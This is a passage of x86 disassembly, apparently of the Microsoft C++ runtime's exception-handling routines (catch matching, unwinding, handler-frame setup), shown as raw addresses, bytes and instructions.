  403c0a:	8b 51 10             	mov    0x10(%ecx),%edx
  403c0d:	8b 44 02 04          	mov    0x4(%edx,%eax,1),%eax
  403c11:	0f be 48 08          	movsbl 0x8(%eax),%ecx
  403c15:	85 c9                	test   %ecx,%ecx
  403c17:	74 02                	je     0x403c1b
  403c19:	eb 94                	jmp    0x403baf
  403c1b:	6a 01                	push   $0x1
  403c1d:	8b 55 24             	mov    0x24(%ebp),%edx
  403c20:	52                   	push   %edx
  403c21:	8b 45 20             	mov    0x20(%ebp),%eax
  403c24:	50                   	push   %eax
  403c25:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  403c28:	51                   	push   %ecx
  403c29:	6a 00                	push   $0x0
  403c2b:	8b 55 f8             	mov    -0x8(%ebp),%edx
  403c2e:	8b 42 0c             	mov    0xc(%edx),%eax
  403c31:	83 e8 01             	sub    $0x1,%eax
  403c34:	c1 e0 04             	shl    $0x4,%eax
  403c37:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  403c3a:	8b 51 10             	mov    0x10(%ecx),%edx
  403c3d:	03 d0                	add    %eax,%edx
  403c3f:	52                   	push   %edx
  403c40:	8b 45 18             	mov    0x18(%ebp),%eax
  403c43:	50                   	push   %eax
  403c44:	8b 4d 14             	mov    0x14(%ebp),%ecx
  403c47:	51                   	push   %ecx
  403c48:	8b 55 10             	mov    0x10(%ebp),%edx
  403c4b:	52                   	push   %edx
  403c4c:	8b 45 0c             	mov    0xc(%ebp),%eax
  403c4f:	50                   	push   %eax
  403c50:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403c53:	51                   	push   %ecx
  403c54:	e8 07 02 00 00       	call   0x403e60
  403c59:	83 c4 2c             	add    $0x2c,%esp
  403c5c:	e9 4e ff ff ff       	jmp    0x403baf
  403c61:	8b e5                	mov    %ebp,%esp
  403c63:	5d                   	pop    %ebp
  403c64:	c3                   	ret
  403c65:	cc                   	int3
  403c66:	cc                   	int3
  403c67:	cc                   	int3
  403c68:	cc                   	int3
  403c69:	cc                   	int3
  403c6a:	cc                   	int3
  403c6b:	cc                   	int3
  403c6c:	cc                   	int3
  403c6d:	cc                   	int3
  403c6e:	cc                   	int3
  403c6f:	cc                   	int3
  403c70:	55                   	push   %ebp
  403c71:	8b ec                	mov    %esp,%ebp
  403c73:	51                   	push   %ecx
  403c74:	8b 45 08             	mov    0x8(%ebp),%eax
  403c77:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  403c7b:	74 0e                	je     0x403c8b
  403c7d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403c80:	8b 51 04             	mov    0x4(%ecx),%edx
  403c83:	0f be 42 08          	movsbl 0x8(%edx),%eax
  403c87:	85 c0                	test   %eax,%eax
  403c89:	75 0a                	jne    0x403c95
  403c8b:	b8 01 00 00 00       	mov    $0x1,%eax
  403c90:	e9 8d 00 00 00       	jmp    0x403d22
  403c95:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403c98:	8b 55 0c             	mov    0xc(%ebp),%edx
  403c9b:	8b 41 04             	mov    0x4(%ecx),%eax
  403c9e:	3b 42 04             	cmp    0x4(%edx),%eax
  403ca1:	74 24                	je     0x403cc7
  403ca3:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403ca6:	8b 51 04             	mov    0x4(%ecx),%edx
  403ca9:	83 c2 08             	add    $0x8,%edx
  403cac:	52                   	push   %edx
  403cad:	8b 45 08             	mov    0x8(%ebp),%eax
  403cb0:	8b 48 04             	mov    0x4(%eax),%ecx
  403cb3:	83 c1 08             	add    $0x8,%ecx
  403cb6:	51                   	push   %ecx
  403cb7:	e8 74 fa ff ff       	call   0x403730
  403cbc:	83 c4 08             	add    $0x8,%esp
  403cbf:	85 c0                	test   %eax,%eax
  403cc1:	74 04                	je     0x403cc7
  403cc3:	33 c0                	xor    %eax,%eax
  403cc5:	eb 5b                	jmp    0x403d22
  403cc7:	8b 55 0c             	mov    0xc(%ebp),%edx
  403cca:	8b 02                	mov    (%edx),%eax
  403ccc:	83 e0 02             	and    $0x2,%eax
  403ccf:	85 c0                	test   %eax,%eax
  403cd1:	74 0c                	je     0x403cdf
  403cd3:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403cd6:	8b 11                	mov    (%ecx),%edx
  403cd8:	83 e2 08             	and    $0x8,%edx
  403cdb:	85 d2                	test   %edx,%edx
  403cdd:	74 39                	je     0x403d18
  403cdf:	8b 45 10             	mov    0x10(%ebp),%eax
  403ce2:	8b 08                	mov    (%eax),%ecx
  403ce4:	83 e1 01             	and    $0x1,%ecx
  403ce7:	85 c9                	test   %ecx,%ecx
  403ce9:	74 0c                	je     0x403cf7
  403ceb:	8b 55 08             	mov    0x8(%ebp),%edx
  403cee:	8b 02                	mov    (%edx),%eax
  403cf0:	83 e0 01             	and    $0x1,%eax
  403cf3:	85 c0                	test   %eax,%eax
  403cf5:	74 21                	je     0x403d18
  403cf7:	8b 4d 10             	mov    0x10(%ebp),%ecx
  403cfa:	8b 11                	mov    (%ecx),%edx
  403cfc:	83 e2 02             	and    $0x2,%edx
  403cff:	85 d2                	test   %edx,%edx
  403d01:	74 0c                	je     0x403d0f
  403d03:	8b 45 08             	mov    0x8(%ebp),%eax
  403d06:	8b 08                	mov    (%eax),%ecx
  403d08:	83 e1 02             	and    $0x2,%ecx
  403d0b:	85 c9                	test   %ecx,%ecx
  403d0d:	74 09                	je     0x403d18
  403d0f:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  403d16:	eb 07                	jmp    0x403d1f
  403d18:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  403d1f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403d22:	8b e5                	mov    %ebp,%esp
  403d24:	5d                   	pop    %ebp
  403d25:	c3                   	ret
  403d26:	cc                   	int3
  403d27:	cc                   	int3
  403d28:	cc                   	int3
  403d29:	cc                   	int3
  403d2a:	cc                   	int3
  403d2b:	cc                   	int3
  403d2c:	cc                   	int3
  403d2d:	cc                   	int3
  403d2e:	cc                   	int3
  403d2f:	cc                   	int3
  403d30:	55                   	push   %ebp
  403d31:	8b ec                	mov    %esp,%ebp
  403d33:	6a ff                	push   $0xffffffff
  403d35:	68 90 f1 40 00       	push   $0x40f190
  403d3a:	68 f8 5a 40 00       	push   $0x405af8
  403d3f:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403d45:	50                   	push   %eax
  403d46:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403d4d:	83 c4 ec             	add    $0xffffffec,%esp
  403d50:	53                   	push   %ebx
  403d51:	56                   	push   %esi
  403d52:	57                   	push   %edi
  403d53:	89 65 e8             	mov    %esp,-0x18(%ebp)
  403d56:	8b 45 08             	mov    0x8(%ebp),%eax
  403d59:	8b 48 08             	mov    0x8(%eax),%ecx
  403d5c:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  403d5f:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  403d62:	3b 55 14             	cmp    0x14(%ebp),%edx
  403d65:	0f 84 89 00 00 00    	je     0x403df4
  403d6b:	83 7d e4 ff          	cmpl   $0xffffffff,-0x1c(%ebp)
  403d6f:	7e 14                	jle    0x403d85
  403d71:	8b 45 10             	mov    0x10(%ebp),%eax
  403d74:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  403d77:	3b 48 04             	cmp    0x4(%eax),%ecx
  403d7a:	7d 09                	jge    0x403d85
  403d7c:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  403d83:	eb 08                	jmp    0x403d8d
  403d85:	e8 c6 08 00 00       	call   0x404650
  403d8a:	89 45 e0             	mov    %eax,-0x20(%ebp)
  403d8d:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  403d94:	8b 55 10             	mov    0x10(%ebp),%edx
  403d97:	8b 42 08             	mov    0x8(%edx),%eax
  403d9a:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  403d9d:	83 7c c8 04 00       	cmpl   $0x0,0x4(%eax,%ecx,8)
  403da2:	74 1c                	je     0x403dc0
  403da4:	68 03 01 00 00       	push   $0x103
  403da9:	8b 55 08             	mov    0x8(%ebp),%edx
  403dac:	52                   	push   %edx
  403dad:	8b 45 10             	mov    0x10(%ebp),%eax
  403db0:	8b 48 08             	mov    0x8(%eax),%ecx
  403db3:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  403db6:	8b 44 d1 04          	mov    0x4(%ecx,%edx,8),%eax
  403dba:	50                   	push   %eax
  403dbb:	e8 60 06 00 00       	call   0x404420
  403dc0:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  403dc7:	eb 17                	jmp    0x403de0
  403dc9:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  403dcc:	51                   	push   %ecx
  403dcd:	e8 5e 00 00 00       	call   0x403e30
  403dd2:	83 c4 04             	add    $0x4,%esp
  403dd5:	c3                   	ret
  403dd6:	8b 65 e8             	mov    -0x18(%ebp),%esp
  403dd9:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  403de0:	8b 55 10             	mov    0x10(%ebp),%edx
  403de3:	8b 42 08             	mov    0x8(%edx),%eax
  403de6:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  403de9:	8b 14 c8             	mov    (%eax,%ecx,8),%edx
  403dec:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  403def:	e9 6b ff ff ff       	jmp    0x403d5f
  403df4:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  403df7:	3b 45 14             	cmp    0x14(%ebp),%eax
  403dfa:	75 09                	jne    0x403e05
  403dfc:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  403e03:	eb 08                	jmp    0x403e0d
  403e05:	e8 46 08 00 00       	call   0x404650
  403e0a:	89 45 dc             	mov    %eax,-0x24(%ebp)
  403e0d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403e10:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  403e13:	89 51 08             	mov    %edx,0x8(%ecx)
  403e16:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403e19:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403e20:	5f                   	pop    %edi
  403e21:	5e                   	pop    %esi
  403e22:	5b                   	pop    %ebx
  403e23:	8b e5                	mov    %ebp,%esp
  403e25:	5d                   	pop    %ebp
  403e26:	c3                   	ret
  403e27:	cc                   	int3
  403e28:	cc                   	int3
  403e29:	cc                   	int3
  403e2a:	cc                   	int3
  403e2b:	cc                   	int3
  403e2c:	cc                   	int3
  403e2d:	cc                   	int3
  403e2e:	cc                   	int3
  403e2f:	cc                   	int3
  403e30:	55                   	push   %ebp
  403e31:	8b ec                	mov    %esp,%ebp
  403e33:	83 ec 08             	sub    $0x8,%esp
  403e36:	8b 45 08             	mov    0x8(%ebp),%eax
  403e39:	8b 08                	mov    (%eax),%ecx
  403e3b:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  403e3e:	8b 55 fc             	mov    -0x4(%ebp),%edx
  403e41:	8b 02                	mov    (%edx),%eax
  403e43:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403e46:	81 7d f8 63 73 6d e0 	cmpl   $0xe06d7363,-0x8(%ebp)
  403e4d:	74 02                	je     0x403e51
  403e4f:	eb 05                	jmp    0x403e56
  403e51:	e8 6a 07 00 00       	call   0x4045c0
  403e56:	33 c0                	xor    %eax,%eax
  403e58:	8b e5                	mov    %ebp,%esp
  403e5a:	5d                   	pop    %ebp
  403e5b:	c3                   	ret
  403e5c:	cc                   	int3
  403e5d:	cc                   	int3
  403e5e:	cc                   	int3
  403e5f:	cc                   	int3
  403e60:	55                   	push   %ebp
  403e61:	8b ec                	mov    %esp,%ebp
  403e63:	83 ec 08             	sub    $0x8,%esp
  403e66:	8b 45 0c             	mov    0xc(%ebp),%eax
  403e69:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403e6c:	83 7d 20 00          	cmpl   $0x0,0x20(%ebp)
  403e70:	74 18                	je     0x403e8a
  403e72:	8b 4d 20             	mov    0x20(%ebp),%ecx
  403e75:	51                   	push   %ecx
  403e76:	8b 55 1c             	mov    0x1c(%ebp),%edx
  403e79:	52                   	push   %edx
  403e7a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403e7d:	50                   	push   %eax
  403e7e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403e81:	51                   	push   %ecx
  403e82:	e8 39 02 00 00       	call   0x4040c0
  403e87:	83 c4 10             	add    $0x10,%esp
  403e8a:	83 7d 2c 00          	cmpl   $0x0,0x2c(%ebp)
  403e8e:	75 0f                	jne    0x403e9f
  403e90:	8b 55 08             	mov    0x8(%ebp),%edx
  403e93:	52                   	push   %edx
  403e94:	8b 45 0c             	mov    0xc(%ebp),%eax
  403e97:	50                   	push   %eax
  403e98:	e8 a3 eb ff ff       	call   0x402a40
  403e9d:	eb 0d                	jmp    0x403eac
  403e9f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403ea2:	51                   	push   %ecx
  403ea3:	8b 55 2c             	mov    0x2c(%ebp),%edx
  403ea6:	52                   	push   %edx
  403ea7:	e8 94 eb ff ff       	call   0x402a40
  403eac:	8b 45 24             	mov    0x24(%ebp),%eax
  403eaf:	8b 08                	mov    (%eax),%ecx
  403eb1:	51                   	push   %ecx
  403eb2:	8b 55 18             	mov    0x18(%ebp),%edx
  403eb5:	52                   	push   %edx
  403eb6:	8b 45 14             	mov    0x14(%ebp),%eax
  403eb9:	50                   	push   %eax
  403eba:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403ebd:	51                   	push   %ecx
  403ebe:	e8 6d fe ff ff       	call   0x403d30
  403ec3:	83 c4 10             	add    $0x10,%esp
  403ec6:	8b 55 24             	mov    0x24(%ebp),%edx
  403ec9:	8b 42 04             	mov    0x4(%edx),%eax
  403ecc:	83 c0 01             	add    $0x1,%eax
  403ecf:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403ed2:	89 41 08             	mov    %eax,0x8(%ecx)
  403ed5:	68 00 01 00 00       	push   $0x100
  403eda:	8b 55 28             	mov    0x28(%ebp),%edx
  403edd:	52                   	push   %edx
  403ede:	8b 45 1c             	mov    0x1c(%ebp),%eax
  403ee1:	8b 48 0c             	mov    0xc(%eax),%ecx
  403ee4:	51                   	push   %ecx
  403ee5:	8b 55 18             	mov    0x18(%ebp),%edx
  403ee8:	52                   	push   %edx
  403ee9:	8b 45 10             	mov    0x10(%ebp),%eax
  403eec:	50                   	push   %eax
  403eed:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403ef0:	51                   	push   %ecx
  403ef1:	8b 55 08             	mov    0x8(%ebp),%edx
  403ef4:	52                   	push   %edx
  403ef5:	e8 26 00 00 00       	call   0x403f20
  403efa:	83 c4 1c             	add    $0x1c,%esp
  403efd:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403f00:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  403f04:	74 0d                	je     0x403f13
  403f06:	8b 45 0c             	mov    0xc(%ebp),%eax
  403f09:	50                   	push   %eax
  403f0a:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  403f0d:	51                   	push   %ecx
  403f0e:	e8 cd ea ff ff       	call   0x4029e0
  403f13:	8b e5                	mov    %ebp,%esp
  403f15:	5d                   	pop    %ebp
  403f16:	c3                   	ret
  403f17:	cc                   	int3
  403f18:	cc                   	int3
  403f19:	cc                   	int3
  403f1a:	cc                   	int3
  403f1b:	cc                   	int3
  403f1c:	cc                   	int3
  403f1d:	cc                   	int3
  403f1e:	cc                   	int3
  403f1f:	cc                   	int3
  403f20:	55                   	push   %ebp
  403f21:	8b ec                	mov    %esp,%ebp
  403f23:	6a ff                	push   $0xffffffff
  403f25:	68 a0 f1 40 00       	push   $0x40f1a0
  403f2a:	68 f8 5a 40 00       	push   $0x405af8
  403f2f:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403f35:	50                   	push   %eax
  403f36:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403f3d:	83 c4 e0             	add    $0xffffffe0,%esp
  403f40:	53                   	push   %ebx
  403f41:	56                   	push   %esi
  403f42:	57                   	push   %edi
  403f43:	89 65 e8             	mov    %esp,-0x18(%ebp)
  403f46:	8b 45 18             	mov    0x18(%ebp),%eax
  403f49:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  403f4c:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  403f53:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403f56:	8b 51 fc             	mov    -0x4(%ecx),%edx
  403f59:	89 55 d8             	mov    %edx,-0x28(%ebp)
  403f5c:	e8 bf 05 00 00       	call   0x404520
  403f61:	8b 40 6c             	mov    0x6c(%eax),%eax
  403f64:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  403f67:	e8 b4 05 00 00       	call   0x404520
  403f6c:	8b 48 70             	mov    0x70(%eax),%ecx
  403f6f:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  403f72:	e8 a9 05 00 00       	call   0x404520
  403f77:	8b 55 08             	mov    0x8(%ebp),%edx
  403f7a:	89 50 6c             	mov    %edx,0x6c(%eax)
  403f7d:	e8 9e 05 00 00       	call   0x404520
  403f82:	8b 4d 10             	mov    0x10(%ebp),%ecx
  403f85:	89 48 70             	mov    %ecx,0x70(%eax)
  403f88:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  403f8f:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  403f96:	8b 55 20             	mov    0x20(%ebp),%edx
  403f99:	52                   	push   %edx
  403f9a:	8b 45 1c             	mov    0x1c(%ebp),%eax
  403f9d:	50                   	push   %eax
  403f9e:	8b 4d 18             	mov    0x18(%ebp),%ecx
  403fa1:	51                   	push   %ecx
  403fa2:	8b 55 14             	mov    0x14(%ebp),%edx
  403fa5:	52                   	push   %edx
  403fa6:	8b 45 0c             	mov    0xc(%ebp),%eax
  403fa9:	50                   	push   %eax
  403faa:	e8 31 eb ff ff       	call   0x402ae0
  403faf:	83 c4 14             	add    $0x14,%esp
  403fb2:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  403fb5:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  403fbc:	eb 31                	jmp    0x403fef
  403fbe:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  403fc1:	51                   	push   %ecx
  403fc2:	e8 a9 00 00 00       	call   0x404070
  403fc7:	83 c4 04             	add    $0x4,%esp
  403fca:	c3                   	ret
  403fcb:	8b 65 e8             	mov    -0x18(%ebp),%esp
  403fce:	c7 45 d4 00 00 00 00 	movl   $0x0,-0x2c(%ebp)
  403fd5:	6a ff                	push   $0xffffffff
  403fd7:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%ebp)
  403fde:	8d 55 f0             	lea    -0x10(%ebp),%edx
  403fe1:	52                   	push   %edx
  403fe2:	e8 db ed ff ff       	call   0x402dc2
  403fe7:	83 c4 08             	add    $0x8,%esp
  403fea:	8b 45 d0             	mov    -0x30(%ebp),%eax
  403fed:	eb 6f                	jmp    0x40405e
  403fef:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  403ff6:	e8 02 00 00 00       	call   0x403ffd
  403ffb:	eb 5e                	jmp    0x40405b
  403ffd:	8b 45 0c             	mov    0xc(%ebp),%eax
  404000:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  404003:	89 48 fc             	mov    %ecx,-0x4(%eax)
  404006:	e8 15 05 00 00       	call   0x404520
  40400b:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  40400e:	89 50 6c             	mov    %edx,0x6c(%eax)
  404011:	e8 0a 05 00 00       	call   0x404520
  404016:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  404019:	89 48 70             	mov    %ecx,0x70(%eax)
  40401c:	8b 55 08             	mov    0x8(%ebp),%edx
  40401f:	81 3a 63 73 6d e0    	cmpl   $0xe06d7363,(%edx)
  404025:	75 33                	jne    0x40405a
  404027:	8b 45 08             	mov    0x8(%ebp),%eax
  40402a:	83 78 10 03          	cmpl   $0x3,0x10(%eax)
  40402e:	75 2a                	jne    0x40405a
  404030:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404033:	81 79 14 20 05 93 19 	cmpl   $0x19930520,0x14(%ecx)
  40403a:	75 1e                	jne    0x40405a
  40403c:	83 7d dc 00          	cmpl   $0x0,-0x24(%ebp)
  404040:	75 18                	jne    0x40405a
  404042:	83 7d d4 00          	cmpl   $0x0,-0x2c(%ebp)
  404046:	74 12                	je     0x40405a
  404048:	e8 dd ed ff ff       	call   0x402e2a
  40404d:	50                   	push   %eax
  40404e:	8b 55 08             	mov    0x8(%ebp),%edx
  404051:	52                   	push   %edx
  404052:	e8 e9 02 00 00       	call   0x404340
  404057:	83 c4 08             	add    $0x8,%esp
  40405a:	c3                   	ret
  40405b:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40405e:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404061:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404068:	5f                   	pop    %edi
  404069:	5e                   	pop    %esi
  40406a:	5b                   	pop    %ebx
  40406b:	8b e5                	mov    %ebp,%esp
  40406d:	5d                   	pop    %ebp
  40406e:	c3                   	ret
  40406f:	cc                   	int3
  404070:	55                   	push   %ebp
  404071:	8b ec                	mov    %esp,%ebp
  404073:	51                   	push   %ecx
  404074:	8b 45 08             	mov    0x8(%ebp),%eax
  404077:	8b 08                	mov    (%eax),%ecx
  404079:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40407c:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40407f:	81 3a 63 73 6d e0    	cmpl   $0xe06d7363,(%edx)
  404085:	75 25                	jne    0x4040ac
  404087:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40408a:	83 78 10 03          	cmpl   $0x3,0x10(%eax)
  40408e:	75 1c                	jne    0x4040ac
  404090:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404093:	81 79 14 20 05 93 19 	cmpl   $0x19930520,0x14(%ecx)
  40409a:	75 10                	jne    0x4040ac
  40409c:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40409f:	83 7a 1c 00          	cmpl   $0x0,0x1c(%edx)
  4040a3:	75 07                	jne    0x4040ac
  4040a5:	b8 01 00 00 00       	mov    $0x1,%eax
  4040aa:	eb 02                	jmp    0x4040ae
  4040ac:	33 c0                	xor    %eax,%eax
  4040ae:	8b e5                	mov    %ebp,%esp
  4040b0:	5d                   	pop    %ebp
  4040b1:	c3                   	ret
  4040b2:	cc                   	int3
  4040b3:	cc                   	int3
  4040b4:	cc                   	int3
  4040b5:	cc                   	int3
  4040b6:	cc                   	int3
  4040b7:	cc                   	int3
  4040b8:	cc                   	int3
  4040b9:	cc                   	int3
  4040ba:	cc                   	int3
  4040bb:	cc                   	int3
  4040bc:	cc                   	int3
  4040bd:	cc                   	int3
  4040be:	cc                   	int3
  4040bf:	cc                   	int3
  4040c0:	55                   	push   %ebp
  4040c1:	8b ec                	mov    %esp,%ebp
  4040c3:	6a ff                	push   $0xffffffff
  4040c5:	68 b8 f1 40 00       	push   $0x40f1b8
  4040ca:	68 f8 5a 40 00       	push   $0x405af8
  4040cf:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4040d5:	50                   	push   %eax
  4040d6:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4040dd:	83 c4 f4             	add    $0xfffffff4,%esp
  4040e0:	53                   	push   %ebx
  4040e1:	56                   	push   %esi
  4040e2:	57                   	push   %edi
  4040e3:	89 65 e8             	mov    %esp,-0x18(%ebp)
  4040e6:	8b 45 10             	mov    0x10(%ebp),%eax
  4040e9:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  4040ed:	74 17                	je     0x404106
  4040ef:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4040f2:	8b 51 04             	mov    0x4(%ecx),%edx
  4040f5:	0f be 42 08          	movsbl 0x8(%edx),%eax
  4040f9:	85 c0                	test   %eax,%eax
  4040fb:	74 09                	je     0x404106
  4040fd:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404100:	83 79 08 00          	cmpl   $0x0,0x8(%ecx)
  404104:	75 05                	jne    0x40410b
  404106:	e9 1f 02 00 00       	jmp    0x40432a
  40410b:	8b 55 10             	mov    0x10(%ebp),%edx
  40410e:	8b 42 08             	mov    0x8(%edx),%eax
  404111:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  404114:	8d 54 01 0c          	lea    0xc(%ecx,%eax,1),%edx
  404118:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  40411b:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  404122:	8b 45 10             	mov    0x10(%ebp),%eax
  404125:	8b 08                	mov    (%eax),%ecx
  404127:	83 e1 08             	and    $0x8,%ecx
  40412a:	85 c9                	test   %ecx,%ecx
  40412c:	74 58                	je     0x404186
  40412e:	6a 01                	push   $0x1
  404130:	8b 55 08             	mov    0x8(%ebp),%edx
  404133:	8b 42 18             	mov    0x18(%edx),%eax
  404136:	50                   	push   %eax
  404137:	e8 24 5b 00 00       	call   0x409c60
  40413c:	83 c4 08             	add    $0x8,%esp
  40413f:	85 c0                	test   %eax,%eax
  404141:	74 39                	je     0x40417c
  404143:	6a 01                	push   $0x1
  404145:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  404148:	51                   	push   %ecx
  404149:	e8 42 5b 00 00       	call   0x409c90
  40414e:	83 c4 08             	add    $0x8,%esp
  404151:	85 c0                	test   %eax,%eax
  404153:	74 27                	je     0x40417c
  404155:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  404158:	8b 45 08             	mov    0x8(%ebp),%eax
  40415b:	8b 48 18             	mov    0x18(%eax),%ecx
  40415e:	89 0a                	mov    %ecx,(%edx)
  404160:	8b 55 14             	mov    0x14(%ebp),%edx
  404163:	83 c2 08             	add    $0x8,%edx
  404166:	52                   	push   %edx
  404167:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40416a:	8b 08                	mov    (%eax),%ecx
  40416c:	51                   	push   %ecx
  40416d:	e8 5e 02 00 00       	call   0x4043d0
  404172:	83 c4 08             	add    $0x8,%esp
  404175:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  404178:	89 02                	mov    %eax,(%edx)
  40417a:	eb 05                	jmp    0x404181
  40417c:	e8 cf 04 00 00       	call   0x404650
  404181:	e9 8d 01 00 00       	jmp    0x404313
  404186:	8b 45 14             	mov    0x14(%ebp),%eax
  404189:	8b 08                	mov    (%eax),%ecx
  40418b:	83 e1 01             	and    $0x1,%ecx
  40418e:	85 c9                	test   %ecx,%ecx
  404190:	74 78                	je     0x40420a
  404192:	6a 01                	push   $0x1
  404194:	8b 55 08             	mov    0x8(%ebp),%edx
  404197:	8b 42 18             	mov    0x18(%edx),%eax
  40419a:	50                   	push   %eax
  40419b:	e8 c0 5a 00 00       	call   0x409c60
  4041a0:	83 c4 08             	add    $0x8,%esp
  4041a3:	85 c0                	test   %eax,%eax
  4041a5:	74 59                	je     0x404200
  4041a7:	6a 01                	push   $0x1
  4041a9:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  4041ac:	51                   	push   %ecx
  4041ad:	e8 de 5a 00 00       	call   0x409c90
  4041b2:	83 c4 08             	add    $0x8,%esp
  4041b5:	85 c0                	test   %eax,%eax
  4041b7:	74 47                	je     0x404200
  4041b9:	8b 55 14             	mov    0x14(%ebp),%edx
  4041bc:	8b 42 14             	mov    0x14(%edx),%eax
  4041bf:	50                   	push   %eax
  4041c0:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4041c3:	8b 51 18             	mov    0x18(%ecx),%edx
  4041c6:	52                   	push   %edx
  4041c7:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4041ca:	50                   	push   %eax
  4041cb:	e8 20 5b 00 00       	call   0x409cf0
  4041d0:	83 c4 0c             	add    $0xc,%esp
  4041d3:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4041d6:	83 79 14 04          	cmpl   $0x4,0x14(%ecx)
  4041da:	75 22                	jne    0x4041fe
  4041dc:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  4041df:	83 3a 00             	cmpl   $0x0,(%edx)
  4041e2:	74 1a                	je     0x4041fe
  4041e4:	8b 45 14             	mov    0x14(%ebp),%eax
  4041e7:	83 c0 08             	add    $0x8,%eax
  4041ea:	50                   	push   %eax
  4041eb:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  4041ee:	8b 11                	mov    (%ecx),%edx
  4041f0:	52                   	push   %edx
  4041f1:	e8 da 01 00 00       	call   0x4043d0
  4041f6:	83 c4 08             	add    $0x8,%esp
  4041f9:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  4041fc:	89 01                	mov    %eax,(%ecx)
  4041fe:	eb 05                	jmp    0x404205
  404200:	e8 4b 04 00 00       	call   0x404650
  404205:	e9 09 01 00 00       	jmp    0x404313
  40420a:	8b 55 14             	mov    0x14(%ebp),%edx
  40420d:	83 7a 18 00          	cmpl   $0x0,0x18(%edx)
  404211:	75 5d                	jne    0x404270
  404213:	6a 01                	push   $0x1
  404215:	8b 45 08             	mov    0x8(%ebp),%eax
  404218:	8b 48 18             	mov    0x18(%eax),%ecx
  40421b:	51                   	push   %ecx
  40421c:	e8 3f 5a 00 00       	call   0x409c60
  404221:	83 c4 08             	add    $0x8,%esp
  404224:	85 c0                	test   %eax,%eax
  404226:	74 3e                	je     0x404266
  404228:	6a 01                	push   $0x1
